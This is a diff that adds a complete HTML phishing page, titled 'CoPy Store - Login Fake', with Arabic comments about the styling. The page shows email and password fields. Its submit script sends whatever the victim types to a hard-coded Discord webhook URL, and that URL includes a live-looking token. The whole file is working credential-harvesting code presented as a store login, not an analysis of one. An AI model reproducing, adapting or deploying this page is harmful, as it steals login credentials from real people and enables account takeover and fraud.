@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CoPy Store - Login Fake</title>
+    <style>
+        body {
+            background: linear-gradient(45deg, #ff0000, #ffcc00); /* خلفية أحمر وأصفر مزدوج */
+            font-family: Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            flex-direction: column;
+        }
+        .title {
+            font-size: 28px;
+            color: #ffffff;
+            margin-bottom: 40px; /* تم رفعها قليلاً */
+        }
+        .login-container {
+            background-color: #2f3136;
+            border-radius: 15px;
+            padding: 40px;
+            width: 380px; /* تم توسيعها */
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.7);
+            position: relative;
+        }
+        h2 {
+            text-align: center;
+            color: #ffffff;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 15px; /* تم زيادة حجم الحقول */
+            margin: 10px 0;
+            border-radius: 8px; /* زادت حواف المدخلات */
+            border: 1px solid #ccc;
+            box-sizing: border-box;
+        }
+        button {
+            width: 100%;
+            padding: 15px; /* تم زيادة حجم الزر */
+            background-color: #7289da;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #5d6e8b;
+        }
+        .qr-code {
+            position: absolute;
+            top: -10px;
+            right: -10px;
+            width: 80px;
+            height: 80px;
+            background-image: url('your_qr_code_image.png'); /* رابط صورة QR */
+            background-size: cover;
+        }
+    </style>
+</head>
+<body>
+    <div class="title">CoPy Store</div>
+    <div class="login-container">
+        <div class="qr-code"></div>
+        <h2>Login</h2>
+        <input type="text" id="Email" placeholder="Email" />
+        <input type="password" id="password" placeholder="Password" />
+        <button onclick="submitForm()">Login</button>
+    </div>
+
+    <script>
+        function submitForm() {
+            const username = document.getElementById('Email').value;
+            const password = document.getElementById('password').value;
+
+            // إرسال البيانات إلى Webhook عبر AJAX
+            fetch('https://discord.com/api/webhooks/1369723183304806541/Bxl3QPjAXxiD-m6WFDoa733TOZiiqe5XEITYwil8FjjbYenGFQ4ibBV31OckZJwOYNSR', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    content: `New login attempt:\nEmail: ${username}\nPassword: ${password}`
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert('Login attempt sent.');
+            })
+            .catch((error) => {
+                console.error('Error:', error);
+            });
+        }
+    </script>
+</body>
+</html>
